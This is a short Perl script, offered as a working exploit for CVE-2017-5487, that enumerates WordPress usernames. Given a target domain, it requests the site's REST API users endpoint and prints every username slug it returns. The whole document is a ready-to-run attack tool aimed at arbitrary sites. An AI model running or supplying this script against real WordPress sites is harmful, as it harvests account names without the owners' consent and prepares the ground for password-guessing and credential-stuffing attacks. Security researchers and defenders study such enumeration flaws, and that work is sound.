#!/usr/bin/perl

# Exploit for user enumation on Wordpress Applications
# Use: ./CVE-2017-5487.pl target.com
# Heitor GouvÃªa - hi@heitorgouvea.me

use JSON;
use 5.010;
use strict;
use warnings;
use LWP::UserAgent;

sub main {
  my $target = $ARGV[0];

  if ($target) {
    $target =~ s/https:\/\/// || $target =~ s/http:\/\/// || $target =~ s/www.//;

    my $userAgent = LWP::UserAgent -> new();
    my $urlReq    = "http://$target/wp-json/wp/v2/users/";
    my $request   = $userAgent -> get ($urlReq,
  		"Accept" => "application/json"
    );

    my $responseCode = $request -> code();

    if ($responseCode == "200") {
      my $datas = decode_json ($request -> content);

    	foreach my $data (@$datas) {
    		my $username = $data -> {'slug'};
    		print "[!] Username -> $username\n";
    	}
    }
  }
}

main();
exit;
